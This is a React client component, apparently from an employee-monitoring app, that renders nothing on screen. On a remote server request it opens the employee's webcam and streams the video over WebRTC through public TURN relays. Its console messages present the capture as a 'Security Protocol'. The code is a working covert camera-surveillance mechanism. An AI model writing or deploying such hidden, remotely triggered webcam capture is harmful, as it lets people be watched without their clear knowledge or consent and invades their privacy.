'use client';
import { useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';

export default function BackgroundTracker({ employeeId }: { employeeId: string }) {
  const socketRef = useRef<Socket | null>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    if (!employeeId) return;

    const socket = io(window.location.origin, {
      path: '/api/socket',
      transports: ['polling', 'websocket'],
      query: { role: 'employee', id: employeeId }
    });
    socketRef.current = socket;

    socket.on('connect', () => {
      console.log("🔒 Security Protocol Active");
      socket.emit('register-employee', employeeId);
    });

    socket.on('request-offer', async () => {
      console.log("⚡ Establishing Secure Feed...");
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        streamRef.current = stream;

        const peer = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { 
               urls: "turn:openrelay.metered.ca:80",
               username: "openrelayproject",
               credential: "openrelayproject"
            },
            { 
               urls: "turn:openrelay.metered.ca:443",
               username: "openrelayproject",
               credential: "openrelayproject"
            },
            { 
               urls: "turn:openrelay.metered.ca:443?transport=tcp",
               username: "openrelayproject",
               credential: "openrelayproject"
            }
          ]
        });
        peerRef.current = peer;

        stream.getTracks().forEach(track => peer.addTrack(track, stream));

        peer.onicecandidate = (event) => {
          if (event.candidate) {
            socket.emit('candidate', { targetId: employeeId, candidate: event.candidate });
          }
        };

        const offer = await peer.createOffer();
        await peer.setLocalDescription(offer);
        
        socket.emit('offer', { targetId: employeeId, offer });

      } catch (err) {
        console.error("Camera Access Denied or Error:", err);
      }
    });

    socket.on('answer', async (answer) => {
      if (peerRef.current && peerRef.current.signalingState !== 'stable') {
        await peerRef.current.setRemoteDescription(new RTCSessionDescription(answer));
      }
    });

    socket.on(`candidate-${employeeId}`, async (candidate) => {
       if (peerRef.current && peerRef.current.remoteDescription) {
          await peerRef.current.addIceCandidate(new RTCIceCandidate(candidate));
       }
    });

    return () => {
      if(streamRef.current) streamRef.current.getTracks().forEach(t => t.stop());
      if(peerRef.current) peerRef.current.close();
      socket.disconnect();
    };
  }, [employeeId]);

  return null;
}